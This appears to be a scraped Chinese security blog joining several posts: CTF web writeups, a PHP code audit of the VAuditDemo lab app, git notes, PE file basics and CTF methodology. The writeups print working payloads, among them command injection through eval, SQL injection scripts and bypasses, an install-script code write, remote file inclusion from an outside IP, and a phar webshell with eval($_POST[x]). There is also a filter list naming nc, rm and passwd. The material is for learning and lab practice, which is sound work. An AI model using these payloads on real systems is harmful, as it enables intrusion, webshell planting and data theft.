preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) 搜索 subject 与 pattern 给定的正则表达式的一个匹配 参数说明 $pattern: 要搜索的模式，字符串形式。 $subject: 输入字符串。 $matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本，如果是第一个子模式匹配到的数据也是显示在$matches[0]中;$matches[1] 将包含第一个捕获子组匹配到的文本，以此类推, print_r($matches) 显示匹配的内容。 $flags：flags 可以被设置为以下标记值： PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。 offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节) 实例一直接上代码index.php123456789101112131415161718192021222324&lt;?php/** * Created by seck. * Date: 2017/10/27 * Time: 20:39 *///index.phperror_reporting(0);include 'config.php';if(isset($_GET['phpinfo']))&#123; php_info();&#125;if(isset($_GET['eval']))&#123; $filter = '/_|(.*)(\\'|\\\"|\\`|\\()(.*)(\\'|\\\"|\\`|\\))|(.php|\\=|\\$)/i'; if(preg_match($filter, $_GET['eval'],$matches))&#123; print_r($matches); var_dump($_GET['eval']); exit('nope'); &#125; var_dump($_GET['eval']); //403 forbidden : system filter eval($_GET['eval']);&#125;highlight_file(__FILE__); config.php123456789101112131415161718&lt;?php/** * Created by seck. * Date: 2017/10/27 * Time: 20:39 */ //config.phperror_reporting(0);function php_info()&#123; exit('PHP Version 7.0.18-0ubuntu0.16.10.1');&#125;$filter = \"/\\||\\/|\\.\\.|config|fwrite|fputs|shutdown|halt|\". \"reboot|init|rm|mv|cp|remove|rename|copy|grep|nc|unlink|find|\". \"apt|yum|passwd|chmod|chown|ln|kill|lilo|ssh|telnet/i\";$implode = implode($_REQUEST);if(preg_match($filter, $implode))&#123; exit('403 forbidden');&#125; 首先过config的判断比较简单 直接使用system();index.php 的正则才是关键1$filter = &apos;/_|(.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))|(.php|\\=|\\$)/i&apos;; 首先分析正则是 从大分三大块 全部是6段，可以使用?eval=.php测试显示1_ | (.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\)) | (.php|\\=|\\$) 到这里我们应该知道第二大段的有3个子模式，所以在匹配时需要同时满足这三个子模式才能匹配，如果我们能同时满足这个三个子模式也就绕过了。比如$filter = &#39;/_|(a)(bb)(c)|(.php|\\=|\\$)/i&#39;;测试?eval=abbc 才能匹配最后我们想构造形如?eval=system(‘cat flag.php’); 进行读取flag文件这里我们可以使用%0a绕过 贪婪模式(是可以匹配上也可以没有匹配上)另两个模式就必须要匹配上四种中的一种 第二个大段的正则也就绕过了，但是第三个大模式.php没有绕过这里我们使用linux 的cat+ 命令查看所有的文件内容即可bp抓一下数据包最后的payload:?eval=system(%0a”%0acat+“%0a)我们分析一下怎么绕过第二段模式的 system(%0a 是绕过(.) 接着双引号满足第二个接着是(.*)我们可有可无 最后必须要满足但是运行在windows的环境下，却不能执行成功，也不知道为什么，知道表哥求py一下。","categories":[{"name":"正则","slug":"正则","permalink":"https://www.xjseck.com/categories/正则/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"},{"name":"正则","slug":"正则","permalink":"https://www.xjseck.com/tags/正则/"}]},{"title":"git控制管理学习","slug":"git控制管理学习","date":"2017-10-27T15:08:31.000Z","updated":"2018-09-14T06:07:35.245Z","comments":true,"path":"2017/10/27/git控制管理学习/","link":"","permalink":"https://www.xjseck.com/2017/10/27/git控制管理学习/","excerpt":"","text":"管理github使用git配合管理github仓库首先在github上创建仓库然后就是你需要设置自己git的ssh-keys进行对自己github仓库的管理具体设置参考key-add之后就是本地创建一个git123456789101112#先创建一个文件夹和远程仓库项目的名称一样然后$ git init$ git remote add master https://github.com/Huseck/scan_kill_php_shell.git 指定远程仓库+$ git remote -v //显示一下信息$ git pull --rebase master master 获取一下readme.md 的信息$ git add . //添加本地文件$ git commit -m &quot;first push&quot; //保存一下信息$ git push -u master master // 上传//之后的每次文件的改变之后使用$ git add .$ git commit -m &quot;修改的信息&quot;$ git push 建议以后的推送使用commit 填写修改的信息比较好回滚其他经常使用到的功能git工具下载：https://git-scm.com/download/配置git信息12git config --global user.name &quot;Your name&quot;git config --global user.email &quot;Your email&quot; 1、git本地仓库初始化1234git initgit remote remove/add origin git仓库地址git pull origin master master //取远程主分支git pull origin Liang Liang //取远程Liang的分支 2、提交远程到仓库123git add .git commit -m &quot;提交信息&quot;git push origin MoLiang //提交到远程分支MoLiang 3、分支管理12git branch Liang //创建Liang的分支git branch origin/Liang //创建Liang的远程分支 4、合并主分区123git checkout master (主分支)git merge origin/MoLianggit push origin master:master //$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt; 5、回滚主分支123456789101112$git status //查看仓库状态$git diff //查看本地和远程仓库的不同$git log 查看commit的sha1值+ --pretty=oneline参数简练显示$git log -p -2 //比对一下内容//进行回滚到上一个版本时，此时的版本就会被删除，本地的文件内容就回滚到上一个版本时的内容，之后push到仓库$git reset --hard b353d4653da422aa6be61696c5c6379bffd7bfc5$git push -f -u master master //本地和远程仓库的文件内容都回到了上一个版本//如果此时你后悔了，还想回到最新的版本中$git reflog //61e013c HEAD@&#123;7&#125;: commit: 增加相似md5值，匹配内容$git reset --hard 61e013c$git push -f -u master master//同想能达到后悔的目的","categories":[{"name":"git","slug":"git","permalink":"https://www.xjseck.com/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://www.xjseck.com/tags/git/"},{"name":"仓库","slug":"仓库","permalink":"https://www.xjseck.com/tags/仓库/"}]},{"title":"一道有意思的注入题","slug":"一道有意思的注入题","date":"2017-10-15T16:10:34.000Z","updated":"2018-09-14T05:53:59.621Z","comments":true,"path":"2017/10/16/一道有意思的注入题/","link":"","permalink":"https://www.xjseck.com/2017/10/16/一道有意思的注入题/","excerpt":"","text":"前言“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现 分析过程先直接上代码123456789101112131415161718192021222324252627282930313233343536$db=\"db\";$db_name=\"###\";$db_pw=\"###\";$host=\"localhost\";$conn=mysqli_connect($host,$db_name,$db_pw,$db);if(!$conn)&#123; die(mysqli_errno());&#125;foreach($_GET as $get)&#123; if(is_array($get))&#123; foreach($get as $g)&#123; if(stristr($g,'select')!=FALSE &amp;&amp; stristr($g,'union')!=FALSE)&#123; die('stop attack!'); &#125;else if(stristr($g,'select')!=FALSE &amp;&amp; stristr($g,'from')!=FALSE)&#123; die('no attack!'); &#125; &#125; &#125;else&#123; if(stristr($get,'select')!=FALSE &amp;&amp; stristr($get,'union')!=FALSE)&#123; die('stop attack!'); &#125; &#125;&#125;$id=$_GET['id'];if(is_array($id))&#123; $sql='select * from user where id in('.implode(',',$id).')'; echo \"2=&gt;\";&#125;else&#123; $sql='select * from user where id ='.$id; echo \"1=&gt;\";&#125;$result=mysqli_query($conn,$sql);while($row=mysqli_fetch_array($result))&#123; printf(\"id: %s&lt;br&gt; Title: %s&lt;br&gt; %s\",$row[0],$row[1],$row[2]);&#125;mysqli_free_result($result); 这里有几个trick要注意 首先分析一下流程开始判断传入的id是否是数组如果是就需要过foreach 的if里(stristr函数)的判断否则也要经过if里的判断 bypass点stristr函数不区分大小写 返回从搜索的字符串开始，没有搜索到就返回FALSE。如果$get(id的值)不是数组就直接进入 123if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123; die(&apos;stop attack!&apos;); &#125; 也就是不能同时存在select 和 union字符，这一点我们可以使用时间的盲注进行,直接传入12$sql=&apos;select * from user where id =&apos;.$id;//payload select * from user where id =1 and(select(sleep(3))) 简单的写一个bool的盲注脚本,也可以使用sqlmap跑一下123456789101112131415161718192021222324252627#coding:utf-8import requestsimport stringstr=string.ascii_lettersstr=str+','print strurl=\"http://127.0.0.1/\"debug = 0 #当没有数据出现就中断注入database ='student'table=''for i in range(1,16): test=debug for x in str: #payload =\"?id=1 and(ascii(substr(database(),%s,1))=%s)\" %(i,ord(x)) payload='?id=1 and(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x73747564656E74),%s,1))=%s)' %(i,ord(x)) u_p=url+payload res=requests.get(u_p) # print u_p if \"admin\" in res.content: table=table+x print \"table:\",table debug=debug+1 break if debug==test: break else: continue 如果判断的再死一点，把union关键字换成from，也就是不能同时出现 select 和union了，没有办法遍历出数据库和表了，只能爆破表名和字段了。else走不通了，那我们按照正常的if来走一遍，首先我们知道可以通过url传数组也就是我们利用传数组这样的方式bypass，最终执行的sql语句就是1$sql=&apos;select * from user where id in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;; 只要能绕过if中的stristr函数的检测就能拼接到sql语句中另一个trick 就是我们传入数组的时候可以这样传入id[]=1&amp;id=2去绕过stristr,也可以拼接到sql语句中按照这样的一个思路12345首先拼接 ) id[]=1)然后是stristr函数id[]= union/* &amp;id[]= */select 1,database(),3 #//$_GET[id]=$id[]= &#123; [0] =&gt; -1) union/* [1] =&gt; */ select 1,user(),3# &#125;//最终的sql=select * from user where id in(-1) union/*,*/select 1,user(),3# 成功使用布尔型的注入。 总结trick点 url 传数组分段传入输入绕过stristr函数的检测","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.xjseck.com/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"}]},{"title":"VAuditDemo代码审计","slug":"VAuditDemo代码审计","date":"2017-09-28T11:06:44.000Z","updated":"2018-09-14T05:51:57.667Z","comments":true,"path":"2017/09/28/VAuditDemo代码审计/","link":"","permalink":"https://www.xjseck.com/2017/09/28/VAuditDemo代码审计/","excerpt":"","text":"前言主要参考Virink师傅的视屏带入门PHP代码审计视频地址系统的主要编写流程比较好分析，PHP嵌套HTML开发。 审计浏览大致的浏览一下系统的文件目录和配置文件说明什么的，这里的系统文件还是比较少一些，主要是浏览一下入口文件(index.php)、配置文件(config.php)、安装文件(install.php)、以及lib.php文件通过这些文件我们能大致的知道系统的一些基本配置和全局设置。我们主要关注一下lib.php文件，只要是加载了lib.php文件首先就设置了 全局变量的防护($_GET、$_POST、$COOKIE)都会自动加载addslashes函数‘ “ null \\ 返回 \\’ \\” \\\\ 代码如下123456789101112131415161718if( !get_magic_quotes_gpc() ) &#123; $_GET = sec ( $_GET ); $_POST = sec ( $_POST ); $_COOKIE = sec ( $_COOKIE ); &#125;$_SERVER = sec ( $_SERVER );function sec( &amp;$array ) &#123; if ( is_array( $array ) ) &#123; foreach ( $array as $k =&gt; $v ) &#123; $array [$k] = sec ( $v ); &#125; &#125; else if ( is_string( $array ) ) &#123; $array = addslashes( $array ); &#125; else if ( is_numeric( $array ) ) &#123; $array = intval( $array ); &#125; return $array;&#125; 然后注意后面自定义的一些安全函数是否能bypass 123456789101112131415161718192021222324function sqlwaf( $str ) &#123; $str = str_ireplace( &quot;and&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;or&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;from&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;execute&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;update&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;count&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;chr&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;mid&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;char&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;union&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;select&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;delete&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;insert&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;limit&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;concat&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;\\\\&quot;, &quot;\\\\\\\\&quot;, $str ); $str = str_ireplace( &quot;&amp;&amp;&quot;, &quot;&quot;, $str ); $str = str_ireplace( &quot;||&quot;, &quot;&quot;, $str ); $str = str_ireplace( &quot;&apos;&quot;, &quot;&quot;, $str ); $str = str_ireplace( &quot;%&quot;, &quot;\\%&quot;, $str ); $str = str_ireplace( &quot;_&quot;, &quot;\\_&quot;, $str ); return $str;&#125; 粗略的看一下后面几段出现替换为空的操作，单引号被替换为空，数字型的注入就可以，可能就会出现问题比如$sql=”select * from user where $id”;就直接bypass payload 如 an||d(sele||ct(sleep(3))) 安装问题install.php 文件开头代码如下1234if (file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &apos;/sys/install.lock&apos;)) &#123; header(&quot;Location: ../index.php&quot;);&#125;...... 这里只是判断了install.lock 文件的存在，正常应该是存在这个文件之后就直接退出后面的操作，没有的话，后面的代码块还会继续执行，所以后面如果出现了可控的参数，一样会带入进行执行操作。问题：可控参数如下：1234$dbhost = $_POST[&quot;dbhost&quot;];$dbuser = $_POST[&quot;dbuser&quot;];$dbpass = $_POST[&quot;dbpass&quot;];$dbname = $_POST[&quot;dbname&quot;]; 前三个是连接数据库的信息没有办法进行写入，$dbname = $_POST[“dbname”];到变量$str_tmp中去”\\$database=\\”$dbname\\”; \\r\\n”;只要保证查询语句不出现错误mysql_query(“CREATE DATABASE $dbname”, $con) or die(mysql_error());创建一个不存在的数据库名就能成功写入config.php文件到目录拼接到sql语句中 “CREATE DATABASE $dbname”, $con payload如下：dbname=test -- -“;phpinfo();”最后的内容写到/sys/config.php中的内容为$database=&quot;test -- -&quot;;phpinfo();”&quot;;造成任意的代码写入漏洞。 文件包含读到index.php文件module参数可控如果开启远程包含 pyload如下123456if (isset($_GET[&apos;module&apos;])) &#123; include $_GET[&apos;module&apos;] . &apos;.inc&apos;; //php.ini 配置开启allow_url_include = On //这里存在远程文件包含module=http://39.108.59.30/1.txt? 1.txt的内容 &lt;?php phpinfo();&#125; 如果是本地文件包含的话，可以利用上传的图片进行包含获得shell比如图片上传的文件代码如下1234User/ updateAvatar.php$avatar = $uploaddir . ‘/u‘. time(). ‘‘ . $_FILES[‘upfile’][‘name’];if (move_uploaded_file($_FILES[‘upfile’][‘tmp_name’], $avatar)) &#123;&#125; 可以上传图片文件 需要爆破一下文件地址然后使用phar协议包含文件首先需要生成phar包文件需要把php.ini phar.readonly 设置成Off然后直接浏览器访问此脚本生成一个my.phar包文件如果包含文件的后缀是.php 或者inc需要改一下脚本的shell的后缀12345678910111213141516&lt;?phptry&#123; $p = new Phar(&quot;my.phar&quot;, 0, &apos;my.phar&apos;);&#125; catch (UnexpectedValueException $e) &#123; die(&apos;Could not open my.phar&apos;);&#125; catch (BadMethodCallException $e) &#123; echo &apos;technically, this cannot happen&apos;;&#125;$p-&gt;startBuffering();$p[&apos;shell.inc&apos;] = &apos;&lt;?php phpinfo(); eval($_POST[x]); ?&gt;&apos;;// make a file named my.phar$p-&gt;setStub(&quot;&lt;?php Phar::mapPhar(&apos;myphar.phar&apos;);__HALT_COMPILER();&quot;);$p-&gt;stopBuffering();?&gt; 最后的payload如下：/index.php?module=phar://uploads/my.gif/shellpost x=phpinfo();类似的伪协议还有zip 注入漏洞文件search.php没有包含lib.php 就直接参数入sql语句，进行全局的过滤，导致注入成功。12345if (!empty($_GET[&apos;search&apos;])) &#123; $query = &quot;SELECT * FROM comment WHERE comment_text LIKE &apos;%&#123;$_GET[&apos;search&apos;]&#125;%&apos;&quot;; //未过滤存在sql注入 $data = mysql_query($query, $conn); ?&gt; 由于包含了config.php error_reporting(0); 只能盲注由于表comment 没有数据使用sleep 貌似没有反应这里使用?search=%’+or if(1,benchmark(50000000,SHA1(1)),1);– -如果查询语句中没有返回值的话使用sleep函数是没有反应的 越权操作没有判断id是否是当前操作的用户。手工检测一般都都是修改id，是否能影响到不同用户的属性。如果是看代码一般是sql语句什么的 看不出来是存在sql注入但是如果对用户的id没有进行判读就会出现越权的操作。可控点$clean_user_id = clean_input($_POST[&#39;id&#39;]);然后紧接着就带入sql语句中$query = “SELECT * FROM users WHERE user_name = ‘$clean_username’”;造成任意用户名被修改 二次注入一般出现的问题是第一次入库被过滤了，但是在出库的时候没有过滤，直接带入到sql语句中。一般是update 或者insert 语句出现问题。问题就出在messageSub.php文件$query = &quot;INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())&quot;;可以看到$_SESSION[‘username’] 被带入sql语句中，我们搜索一下$_SESSION[‘username’] 在哪被赋值User/logCheck.php处出现赋值$_SESSION[‘username’] = $row[‘user_name’];可以发现前面是判断用户登录$query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_name&#39; AND user_pass = SHA(&#39;$clean_pass&#39;)&quot;;可以让形如seck\\的用户成功登录返回的结果带入$_SESSION[‘username’] = $row[‘user_name’];进行赋值。此时$_SESSION[&#39;username&#39;]就等于seck\\所以只要$_SESSION[&#39;username&#39;] 带入了sql语句中就会转义引号，就造成了二次注入。漏洞流程分析如下：sys/lib.php首先加载此文件123456789101112131415161718192021222324252627282930if (!get_magic_quotes_gpc()) &#123; $_GET = sec($_GET); $_POST = sec($_POST); $_COOKIE = sec($_COOKIE);&#125;$_SERVER = sec($_SERVER);function sec(&amp;$array)&#123; if (is_array($array)) &#123; foreach ($array as $k =&gt; $v) &#123; $array[$k] = sec($v); &#125; &#125; else if (is_string($array)) &#123; $array = addslashes($array); &#125; else if (is_numeric($array)) &#123; $array = intval($array); &#125; return $array;&#125;会有一个全局的防注入Addslashes自动会转义 现在我们看一下注册用户的sql语句User/regCheck.php大致看了一下代码注册成功就直接赋值$_SESSION[&apos;username&apos;]，相当于完成了登录。$clean_name = clean_input($_POST[&apos;user&apos;]);看一下clean_input函数function clean_input($dirty)&#123; return mysql_real_escape_string(stripslashes($dirty));&#125; 所以我们只要注册一个形如seck\\末尾是斜杠的用户，存储在数据库的用户名称的数据也是seck\\注册seck\\用户后，$_SESSION[&#39;username&#39;] 的赋值实在regCheck.php文件中进行赋值的，被clean_input函数给过滤了，我们需要重新登录一下，$_SESSION[&#39;username&#39;] 的值才是seck\\,之后转到留言处，进行sql语句的拼接造成二次注入，查看一下messageSub.php的sql语句如下：INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())payload如下：updatexml(1,concat(0x7e,database(),0x7e),1),2)#’INSERT INTO comment(user_name,comment_text,pub_date) VALUES (‘seck\\’,’,updatexml(1,concat(0x7e,database(),0x7e),1),2)#’,now!(sql)[erci.png] 逻辑漏洞后台登录使用验证码进行防止爆破密码，一般我们找逻辑漏洞的点一般是验证码、密码找回、参数值等这里就会发现我们登录一个用户，判断验证码时，没有更新，也就是我们每一次登录，填写一次验证码就可以测试多个密码值，验证码没有失效。主要代码 123456if (isset($_POST[&apos;submit&apos;]) &amp;&amp; !empty($_POST[&apos;user&apos;]) &amp;&amp; !empty($_POST[&apos;pass&apos;])) &#123; include_once(&apos;../header.php&apos;); if(@$_POST[&apos;captcha&apos;] !== $_SESSION[&apos;captcha&apos;])&#123; header(&apos;Location: login.php&apos;); exit; &#125; 这里的问题，在exit之前给$_SESSION[&#39;captcha&#39;] 重新赋新值。 总结实际上线的系统一般都是基于框架开发，MVC设计思想的框架设计，一定程度上此测试系统在阅读和审计上面都是一些自行设计的一些问题，到实际项目业务中还是有一定的偏差，但是可以很好的练习PHP代码上的安全编写问题。后续的原创技术文章持续更新。 （大象安全,注重人才培养和技术分享，感谢关注！）","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://www.xjseck.com/tags/代码审计/"}]},{"title":"从PHP基础到代码审计","slug":"从PHP基础到代码审计","date":"2017-09-11T10:55:25.000Z","updated":"2018-06-15T11:02:48.964Z","comments":true,"path":"2017/09/11/从PHP基础到代码审计/","link":"","permalink":"https://www.xjseck.com/2017/09/11/从PHP基础到代码审计/","excerpt":"","text":"从入坑CTF-web开始一开始是观摩wooyun开始的，从那时开始感觉自己在学习的路上就停不下来了，也是作为“脚本小子”开始，感觉浮躁的不行，再到入坑CTF，认识了更多的人，从被虐开始，也是能让自己停下来，怎么构建自己的技能树，又怎么静下心来积淀，所以决定从头系统的学习PHP到代码审计，看看自己能做多远，少花一点时间划水了。 PHP基础记得最清楚的事情是使用工具爆破网站目录，发现类似url：ip/item/index/或者类似ip/index.php/Controller/index 发现扫描的文件却没有几个，后来发现是MVC的设计系统。这里就打算从撸PHP项目，实现一些简单的项目入手学习，就由浅入深慢慢学习吧，主要参考 高洛峰的《细说PHP》WooYunPages《深入PHP面向对象 模式与实践》 后面的内容会详细介绍PHP基础的一些学习 代码审计主要可以从几方面进行学习总结。 CTF题目 乌云案例 漏洞演示系统 (DVWA SQLI ….) 开源系统 审计案例 漏洞总结 安装问题 包含漏洞 找回密码 文件上传 文件操作 加密函数 Xss SQLinject CSRF SSRf 命令执行 越权 变量覆盖 Xpath 注入 模板注入 危险函数 信息泄露 PHP版本特性 写到最后整个过程持续的时间会比较久，希望自己能够坚持下去，也希望能帮助到有此研究学习意向的 朋友。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/categories/PHP/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"}]},{"title":"Mini_Project_RCE_理论篇(1)","slug":"Mini-Project-RCE-理论篇-1","date":"2017-09-09T14:01:27.000Z","updated":"2018-06-11T07:22:23.384Z","comments":true,"path":"2017/09/09/Mini-Project-RCE-理论篇-1/","link":"","permalink":"https://www.xjseck.com/2017/09/09/Mini-Project-RCE-理论篇-1/","excerpt":"","text":"作者: tangKID 1.PE结构介绍：PE结构是Windows平台上可执行文件所必须遵循的格式，通俗的说就是后缀为.exe的文件，后期大家在Windows下碰到的各种加壳和脱壳工具的使用和编写过程都离不开PE结构。 1.1PE节区(Section):.text这个节区存放着程序的代码段的内容。.data这个节区存放着程序的数据段的内容。.idata存放着从终端输入到程序的内容。.rsrc这个节区通常存放着一些模块的资源信息，这个模块通常使用较少.当然在NT中定义了有九种预设定的section的内容，这里介绍的只是比较常见和常用的区段。 1.2PE的历史残留问题:接触DOS的人看到这里应该就不会觉得陌生了，这里介绍的就是DOS头和DOS存根.PE文件的第一个字节起始于MS-DOS头部，被称作IMAGE_DOS_HEADER(这个结构的具体内容大家上网查询就可以). 1.3PE头(又名NT头):PE头表示为结构体IMAGE_NT_HEADERS其中IMAGE_NT_HEADERS中包含着另外两个结构体:1.IMAGE_FILE_HEADER 包含一些底层的硬件信息，不是特别常用。2.IMAGE_OPTIONAL_HEADER32 这个结构体是PE中最大的结构体，也是包含了RE中我们比较重要的信息。 其中比较重要的几项:1、入口点 Entry Point2、文件偏移地址 File Offset3、虚拟地址 Virtual Address 简称:VA4、基地址 ImageBase5、相对虚拟地址 Relative Virual Address 简称:RVARVA (相对虚拟地址) =VA (虚拟地址) － ImageBase (基地址)左边是存放在磁盘中，右边是加载到内存中 1.4PE结构在实践中的情况:对一个可执行文件进行PE结构的查看 1.4.1简单的Hello Word图1.4.1 程序源码 图1.4.2二进制打开 1.4.2二进制分析:(1)看到最开始的”4D 5A”，ASCII码翻译过来就是”MZ”,也就是前面提到的DOS头,从0000000h~00000040h都是DOS头。(2)DOS存根就是从00000040h开始直到”PE”之前都是DOS存根。(3)从”50 45”(“PE”)开始就是PE头(4)从PE头之后往下就是各个节区头，每个节区的起始都是”2E”(5)各个节区头之后就是各个节区的二进制表示。 1.5 PE工具的介绍和使用:1.5.1工具PEiD: 1.5.2装载我们前面的Hello World程序: 请注意，PEiD能够分析的C++程序一般在VS2013之后都会显示C++8.0。 1.5.3节查看器二进制表示中的入口点 1.5.4 PE细节","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"RE","slug":"RE","permalink":"https://www.xjseck.com/tags/RE/"}]},{"title":"CTF-Web解题思路","slug":"CTF-Web解题思路","date":"2017-09-09T07:10:35.000Z","updated":"2018-07-15T04:39:23.118Z","comments":true,"path":"2017/09/09/CTF-Web解题思路/","link":"","permalink":"https://www.xjseck.com/2017/09/09/CTF-Web解题思路/","excerpt":"","text":"简要描述入门安全的方式个人感觉还是从CTF来入手，详细的学习路线可以 知乎上搜索，这里不再累述。Web方面还可以从wooyun镜像来学习。自己也入坑了差不多两年了，大致的总结一下解题思路和自己的一些心态体会吧。 体会当时是14年入的大学，大一打游戏度过，偶然的机会是15年大二，偶得一个学长带我参加了一下新大的安全比赛，当时的比赛水的不行，都不算是比赛吧，偶然听到了wooyun这个社区，之后就疯狂的百度浏览wooyun，获取WooYun账号，开始水群，就开始各种搜索怎么入门安全，怎么提升技能，听说了CTF，由于新疆的高校也没有CTF比赛，学校以往也是没有学长搞过，只能从网上获取，后面基本上是见到比赛就参加水群，浏览大佬们的博客，关注time-xctf，也是浮躁的不行，也参过一些线下的CTF比赛，基本上是被血虐，其中的收获也是不少的，至少让自己在安全的路上不再是孤独的人。这里就总结一下自己学到的一些套路，也算是为自己吧，毕竟曾经爱过。 套路考察自己相对擅长WEB方面的一些题目，就总结WEB方面的套路，RE逆向的姿势可以参考tangKID小基友的总结。 基础类使用Burp Suite 抓包基本上就能看到题目的提示和考察的知识点。主要这类题目包括：1.HTTP 头知识（User-Agent、XFF、referer、cookie、藏flag和自定义的一些header包括响应头）2.URL知识 包括传参数、数组、字符、编码。3.修改数据包绕过waf、防护或后缀名等。 汇总引用P牛总结的题目汇总 一、爆破，包括md5、爆破随机数、验证码识别等二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\\0截断、iconv截断、各种协议流四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小五、各种找源码技巧，包括git、svn、xxx.php.swp、www.(zip|tar.gz|rar|7z)、xxx.php.bak、xxx.php~六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% &lt;script language=php&gt;、花式解析漏洞、ffmpeg-avi-m3u-xbin七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱十、社工，包括花式查社工库、微博、QQ签名、whois十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）十五、协议，花式IP伪造 X-Forwarded-For/Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包十六、逻辑错误（用户注册、已存在、长度）十七、ssrf python-django-directory 比如直接127.0.0.1/../../etc/passwd 进阶类我们知道了题目的意图，可能是几个点都需要满足或者有好几层再或者是题目的页面功能比较齐全亦或者是有什么黑科技，我们就需要分析、google。先大致分析整个题目的功能和参数，一般的思路是扫描备份文件关注最近爆发的漏洞事件，进行代码分析，这里就包含的知识点就比较多了，考察代码审计的功底了，需要提升代码功底，需要学习PHP基础、MVC设计思想、框架使用，这里的就不展开后面会更新PHP学习到实操的代码审计吧，慢慢积攒吧。 线下的一些总结攻防模式一。沙盒模式2016“丝绸之路”杯网络安全精英赛这个算是自己比较正式的CTF线下的比赛了题型 ：贴近实际的目标网站，隐含着花样的拓扑结构，有4个沙盒，各个沙盒可能有关联。 入手点：一。实际的网站一般会是通用的开源框架，需要掌握流行开源框架的利用的exploit。快速的定位漏洞的位置。一 未果的话，快速扫描目录，是否有信息泄漏，和铭感文件。然后就是定位到后台地址，猜用户名和密码，弱口令是关键。还有待扩思路。 进入后台之后的思路就是先getshell ，getshell 的思路就是后台的上传漏洞，一般是后台的编辑插件，比如fuck edit …绕过这些插件的过滤，再者是数据库备份，数据库命令执行等等。提权: 这里如果是window提权首先如果是IIS+2003使用菜刀+pr 或者就是大马+15051exp来提权。如果有防护，使用组建或者免杀等方法提权。获取flag：搜索flag文件，一般是在管理员的桌面。 最后扩大战果：快速的分析此网站所在的网络环境，是否与其他题有关联，是否还存在内网环境等。信息收集的快速定位与扩大化。 这次比赛的总结：开始2个小时的沙盒模式，沙盒1——192.168.199.101 提示don’tscan，没有任何 的思路。沙盒2——102 是一个java的题很像线上的比赛题，这里不是很懂javaweb的参数问题就是没有后缀名的内部传参 比如102/order 显示信息 